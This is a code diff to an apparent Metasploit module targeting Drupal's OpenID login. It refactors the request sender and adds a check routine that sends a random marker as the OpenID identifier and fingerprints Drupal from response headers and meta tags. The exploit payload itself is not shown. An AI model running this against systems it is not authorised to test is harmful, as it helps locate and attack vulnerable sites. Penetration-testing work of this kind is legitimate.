@@ -72,7 +72,7 @@ EOF
   end
 
   def primer
-    res = send_openid_auth
+    res = send_openid_auth(get_uri)
 
     if res.nil?
       # nothing to do here...
@@ -111,6 +111,32 @@ EOF
     service.stop
   end
 
+  def check
+    signature = Rex::Text.rand_text_alpha(5 + rand(5))
+    res = send_openid_auth(signature)
+
+    unless res
+      return Exploit::CheckCode::Unknown
+    end
+
+    if res.code == 200 and res.body =~ /openid_identifier.*#{signature}/
+      return Exploit::CheckCode::Detected
+    end
+
+    if generated_with_drupal?(res)
+      return Exploit::CheckCode::Safe
+    end
+
+    return Exploit::CheckCode::Unknown
+  end
+
+  def generated_with_drupal?(http_response)
+    return false if http_response.blank?
+    return true if http_response.headers['X-Generator'] and http_response.headers['X-Generator'] =~ /Drupal/
+    return true if http_response.body and http_response.body.to_s =~ /meta.*Generator.*Drupal/
+    return false
+  end
+
   def run
     @prefix = Rex::Text.rand_text_alpha(4 + rand(4))
     @suffix = Rex::Text.rand_text_alpha(4 + rand(4))
@@ -128,7 +154,7 @@ EOF
     send_response_html(cli, xrds_file, { 'Content-Type' => 'application/xrds+xml' })
   end
 
-  def send_openid_auth
+  def send_openid_auth(identifier)
     res = send_request_cgi({
       'uri'    => normalize_uri(target_uri.to_s, "/"),
       'method' => 'POST',
@@ -137,7 +163,7 @@ EOF
         "destination" => "node"
       },
       'vars_post' => {
-        "openid_identifier" => "#{get_uri}",
+        "openid_identifier" => identifier,
         "name" => "",
         "pass" => "",
         "form_id" => "user_login_block",
